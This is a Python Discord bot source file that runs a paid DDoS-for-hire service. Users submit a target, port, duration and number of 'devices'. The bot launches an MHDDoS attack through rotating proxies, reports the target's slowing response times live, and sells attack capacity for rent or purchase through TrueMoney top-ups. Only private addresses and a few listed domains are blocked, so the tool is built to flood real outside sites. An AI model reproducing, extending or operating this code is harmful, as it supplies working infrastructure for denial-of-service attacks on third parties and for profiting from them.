# bot.py
import asyncio
import ipaddress
import os
import re
import time
from urllib.parse import urlparse

import aiohttp
import discord
from discord.ext import commands, tasks

from config import *
from database import Database
from mhddos_engine import MHDDoSEngine
from proxy_manager import ProxyManager
from truemoney import TrueMoneyClient
from ui_components import (
    AttackPanel, build_attack_embed, build_module_embed,
    build_attack_running_embed, ModuleView,
    ShopView, build_shop_embed, DeviceTypeView, PeriodView, QuantityView,
    RENT_PRICES, BUY_PRICES, RENT_SECONDS,
)

intents = discord.Intents.default()
intents.message_content = True
intents.members = True

bot = commands.Bot(command_prefix=PREFIX, intents=intents)
db = Database()
engine = MHDDoSEngine()
proxy_mgr = ProxyManager()
tm = TrueMoneyClient()

active_attacks: dict[int, dict] = {}


# ============================================================
# Helpers
# ============================================================
def is_owner(user_id: int) -> bool:
    return user_id == OWNER_ID


def is_forbidden(target: str) -> bool:
    t = target.strip().lower()
    if "://" in t:
        host = urlparse(t).hostname or ""
    else:
        host = t.split("/")[0].split(":")[0]

    if any(host == tld.lstrip(".") or host.endswith(tld)
           for tld in FORBIDDEN_TLDS):
        return True

    try:
        ip = ipaddress.ip_address(host)
        if ip.is_private or ip.is_loopback or ip.is_link_local or ip.is_reserved:
            return True
    except ValueError:
        pass

    return host in FORBIDDEN_IPS


# ============================================================
# Tasks
# ============================================================
@tasks.loop(minutes=1)
async def rental_watchdog():
    try:
        expired = await db.pop_expired_rentals()
    except Exception:
        return
    for r in expired:
        user = bot.get_user(r["user_id"])
        if user:
            try:
                await user.send(
                    f"⏰ ยศเช่าหมดอายุ — ลบ {r['devices']} device แล้ว"
                )
            except discord.Forbidden:
                pass


@bot.event
async def on_ready():
    os.makedirs("data", exist_ok=True)
    await db.init()
    print(f"[VANTA] logged in as {bot.user}")

    asyncio.create_task(proxy_mgr.auto_refresh_loop())

    bot.add_view(AttackPanel(OWNER_ID))
    bot.add_view(ShopView())

    if not rental_watchdog.is_running():
        rental_watchdog.start()


# ============================================================
# Setup commands
# ============================================================
@bot.command()
async def setup(ctx):
    if not is_owner(ctx.author.id):
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    await ctx.send(embed=build_attack_embed(), view=AttackPanel(OWNER_ID))


@bot.command()
async def shop(ctx):
    if not is_owner(ctx.author.id):
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    await ctx.send(embed=build_shop_embed(), view=ShopView())


# ============================================================
# Attack flow
# ============================================================
async def handle_attack_submit(interaction: discord.Interaction, modal):
    user_id = interaction.user.id

    if not is_owner(user_id):
        await interaction.response.send_message(
            "ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงถุ้ย", ephemeral=True
        )
        return

    user = await db.get_user(user_id)
    if user["banned"]:
        await interaction.response.send_message(
            "มึงโดนแบนอยู่ ใช้บอทไม่ได้ — ติดต่อเจ้าของบอท", ephemeral=True
        )
        return

    target = modal.target.value.strip()
    try:
        port = int(modal.port.value)
        duration = min(int(modal.duration.value), MAX_DURATION)
        devices = int(modal.device.value)
    except ValueError:
        await interaction.response.send_message(
            "ใส่ตัวเลขให้ถูกต้อง (Port / Time / Device)", ephemeral=True
        )
        return

    if devices > user["devices"]:
        await interaction.response.send_message(
            f"มีDevice ไม่พอนะ ไปซื้อเพิ่มด้วย (มี {user['devices']} เครื่อง)",
            ephemeral=True,
        )
        return

    if is_forbidden(target):
        warns = await db.add_warning(user_id)
        if warns >= MAX_WARNINGS:
            await interaction.response.send_message(
                "อย่ายิงเว็บต้องห้ามอ่านด้วยอีโง่ — ครบ 3 ครั้ง **โดนแบนแล้ว**",
                ephemeral=True,
            )
        else:
            await interaction.response.send_message(
                f"อย่ายิงเว็บต้องห้ามอ่านด้วยอีโง่ เตือนรอบ {warns}",
                ephemeral=True,
            )
        return

    view = ModuleView(user_id, target, port, duration, devices)
    await interaction.response.send_message(
        embed=build_module_embed(), view=view, ephemeral=True
    )


async def start_attack(interaction: discord.Interaction, module: str,
                       target: str, port: int, duration: int, devices: int):
    user_id = interaction.user.id

    if engine.is_running(user_id):
        await interaction.response.send_message(
            "มึงมี attack รันอยู่แล้ว", ephemeral=True
        )
        return

    await interaction.response.defer()

    proxy_mgr.write_for_devices(devices)
    await db.log_attack(user_id, target, port, duration, module)

    try:
        proc = await engine.start(user_id, module, target,
                                  port, duration, devices)
    except Exception as e:
        await interaction.followup.send(f"เริ่มไม่สำเร็จ: {e}", ephemeral=True)
        return

    embed = build_attack_running_embed(
        target=f"{target}:{port}", time_left=duration,
        speed="measuring...", module=module,
    )
    await interaction.followup.send(embed=embed)
    msg = await interaction.original_response()

    state = {
        "target": target, "port": port, "duration": duration,
        "module": module, "devices": devices,
        "start": time.time(), "message": msg, "proc": proc,
    }
    active_attacks[user_id] = state
    asyncio.create_task(_attack_loop(user_id, state))


async def _attack_loop(user_id: int, state: dict):
    msg: discord.Message = state["message"]
    proc = state["proc"]
    target_full = f"{state['target']}:{state['port']}"

    while True:
        # process ตายก่อนเวลา?
        if proc.returncode is not None:
            engine.running.pop(user_id, None)
            active_attacks.pop(user_id, None)
            try:
                await msg.edit(embed=discord.Embed(
                    title="⚠️ Attack หยุดกลางทาง",
                    description=f"MHDDoS exit code `{proc.returncode}`",
                    color=discord.Color.orange(),
                ))
            except discord.HTTPException:
                pass
            return

        elapsed = time.time() - state["start"]
        left = max(0, state["duration"] - int(elapsed))
        speed = await _measure_speed(state["target"], state["port"])
        embed = build_attack_running_embed(
            target=target_full, time_left=left,
            speed=speed, module=state["module"],
        )
        try:
            await msg.edit(embed=embed)
        except discord.HTTPException:
            pass

        if left <= 0:
            await engine.stop(user_id)
            active_attacks.pop(user_id, None)
            try:
                await msg.edit(embed=discord.Embed(
                    title="✅ จบการโจมตี",
                    color=discord.Color.green(),
                    description=f"ยิง `{target_full}` "
                                f"ครบ {state['duration']}s แล้ว",
                ))
            except discord.HTTPException:
                pass
            return

        await asyncio.sleep(1)


async def _measure_speed(target: str, port: int) -> str:
    if target.startswith("http"):
        url = target
    else:
        scheme = "https" if port in (443, 8443) else "http"
        url = f"{scheme}://{target}:{port}"
    try:
        start = time.time()
        async with aiohttp.ClientSession() as s:
            async with s.get(url, timeout=5) as r:
                data = await r.read()
        elapsed = max(0.001, time.time() - start)
        ms = int(elapsed * 1000)
        kbps = (len(data) / 1024) / elapsed
        return f"{ms}ms / {kbps:.1f} KB/s"
    except Exception:
        return "offline / timeout"


# ============================================================
# !device / !b / !ub
# ============================================================
@bot.command()
async def device(ctx, member: discord.Member = None,
                 amount: str = None, duration: str = "TH"):
    if not is_owner(ctx.author.id):
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    if member is None or amount is None:
        await ctx.send("ใช้: `!device @user +1 1h` (TH = ถาวร)")
        return

    sign = 1 if amount.startswith("+") else -1 if amount.startswith("-") else 1
    try:
        num = int(re.sub(r"[^0-9]", "", amount) or "0")
    except ValueError:
        await ctx.send("จำนวนไม่ถูกต้อง")
        return
    if num <= 0:
        await ctx.send("จำนวนต้องมากกว่า 0")
        return

    if sign < 0:
        new = await db.add_devices(member.id, -num)
        await ctx.send(f"ลบ {num} device จาก {member.mention} — เหลือ {new}")
        return

    new = await db.add_devices(member.id, num)
    if duration.upper() == "TH":
        await ctx.send(
            f"เพิ่ม {num} device ให้ {member.mention} (ถาวร) — รวม {new}"
        )
        return

    # คำนวณ seconds
    if duration.endswith("h"):
        secs = int(duration[:-1]) * 3600
    elif duration.endswith("d"):
        secs = int(duration[:-1]) * 86400
    else:
        await ctx.send("รูปแบบเวลา: 1h / 1d / TH")
        return

    expires_at = int(time.time()) + secs
    await db.add_rental(member.id, num, expires_at)
    await ctx.send(
        f"เพิ่ม {num} device ให้ {member.mention} ({duration}) — รวม {new}"
    )


@bot.command()
async def b(ctx, member: discord.Member):
    if not is_owner(ctx.author.id):
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    await db.set_ban(member.id, True)
    await ctx.send(f"แบน {member.mention} แล้ว")


@bot.command()
async def ub(ctx, member: discord.Member):
    if not is_owner(ctx.author.id):
        await ctx.send("ชั้นต่ำอยากจะใช้คำสั่งชั้นสูงรั่ว5555")
        return
    await db.set_ban(member.id, False)
    await ctx.send(f"ปลดแบน {member.mention} แล้ว")


# ============================================================
# Shop flows
# ============================================================
async def shop_device_type_selected(interaction: discord.Interaction,
                                    mode: str):
    if mode == "rent":
        await interaction.response.edit_message(
            content="เลือกช่วงเวลา:", embed=None, view=PeriodView()
        )
    else:
        await interaction.response.edit_message(
            content="เลือกจำนวน:", embed=None, view=QuantityView("buy")
        )


async def shop_period_selected(interaction: discord.Interaction, period: str):
    await interaction.response.edit_message(
        content=f"เลือกจำนวน (เช่า {period}):",
        embed=None, view=QuantityView("rent", period),
    )


async def shop_quantity_selected(interaction: discord.Interaction, mode: str,
                                 period: str | None, qty: int):
    user_id = interaction.user.id
    user = await db.get_user(user_id)

    if mode == "rent":
        if period is None:
            await interaction.response.edit_message(
                content="ไม่พบช่วงเวลา", view=None
            )
            return
        price = RENT_PRICES.get(period, {}).get(qty)
    else:
        price = BUY_PRICES.get(qty)

    if price is None:
        await interaction.response.edit_message(
            content="ไม่พบราคา", view=None
        )
        return

    if user["balance"] < price:
        await interaction.response.edit_message(
            content=f"เงินไม่พอ (มี {user['balance']:.0f}💵 ต้องใช้ {price}💵)",
            view=None,
        )
        return

    if mode == "buy" and user["devices"] + qty > MAX_DEVICES_PURCHASE:
        await interaction.response.edit_message(
            content=f"ซื้อไม่เกิน {MAX_DEVICES_PURCHASE} device "
                    f"(มีอยู่ {user['devices']})",
            view=None,
        )
        return

    # ตัดเงิน
    await db.add_balance(user_id, -price, "purchase",
                         f"{mode} {qty} {period or ''}")
    new_dev = await db.add_devices(user_id, qty)

    # ถ้าเช่า → add rental record
    if mode == "rent":
        secs = RENT_SECONDS.get(period, 0)
        if secs:
            await db.add_rental(user_id, qty, int(time.time()) + secs)

    new_bal = (await db.get_user(user_id))["balance"]

    try:
        await interaction.user.send(
            f"ซื้อสำเร็จ! ได้ {qty} device — รวม {new_dev} device\n"
            f"เงินเหลือ {new_bal:.0f}💵"
        )
    except discord.Forbidden:
        pass

    await interaction.response.edit_message(
        content=f"ซื้อสำเร็จ {qty} device — เหลือเงิน {new_bal:.0f}💵",
        view=None,
    )

    log = bot.get_channel(LOG_CHANNEL_ID)
    if log:
        await log.send(
            f"🛒 **{interaction.user}** {mode} {qty} device "
            f"({period or 'buy'}) — {price}💵 — เหลือ {new_bal:.0f}💵"
        )


# ============================================================
# Topup (TrueMoney)
# ============================================================
async def process_topup(interaction: discord.Interaction, link: str):
    await interaction.response.defer(ephemeral=True)
    user_id = interaction.user.id

    result = await tm.redeem(link)
    if not result["success"]:
        await interaction.followup.send(
            "รับซองไม่สำเร็จ — เช็คลิงก์อีกครั้ง", ephemeral=True
        )
        return

    amount = result["amount"]
    new_bal = await db.add_balance(user_id, amount, "topup", link)
    user = await db.get_user(user_id)
    await db.update_user(
        user_id, total_deposited=user["total_deposited"] + amount
    )

    await interaction.followup.send(
        f"เติม {amount:.0f}💵 สำเร็จ — เหลือ {new_bal:.0f}💵",
        ephemeral=True,
    )

    log = bot.get_channel(LOG_CHANNEL_ID)
    if log:
        await log.send(
            f"💰 **{interaction.user}** เติม {amount:.0f}💵 "
            f"— เหลือ {new_bal:.0f}💵"
        )


@bot.command()
async def topup(ctx, link: str = None):
    if not link:
        await ctx.send("ใช้: `!topup <ลิงก์ซองทรูมันนี่>`")
        return

    result = await tm.redeem(link)
    if not result["success"]:
        await ctx.send("รับซองไม่สำเร็จ — ตรวจสอบลิงก์อีกครั้ง")
        return

    user_id = ctx.author.id
    amount = result["amount"]
    new_bal = await db.add_balance(user_id, amount, "topup", link)
    user = await db.get_user(user_id)
    await db.update_user(
        user_id, total_deposited=user["total_deposited"] + amount
    )

    await ctx.send(f"เติมเงินสำเร็จ {amount:.0f}💵 — เหลือ {new_bal:.0f}💵")

    log = bot.get_channel(LOG_CHANNEL_ID)
    if log:
        await log.send(
            f"💰 **{ctx.author}** เติม {amount:.0f}💵 — เหลือ {new_bal:.0f}💵"
        )


# ============================================================
# Run
# ============================================================
if __name__ == "__main__":
    os.makedirs("data", exist_ok=True)
    bot.run(BOT_TOKEN)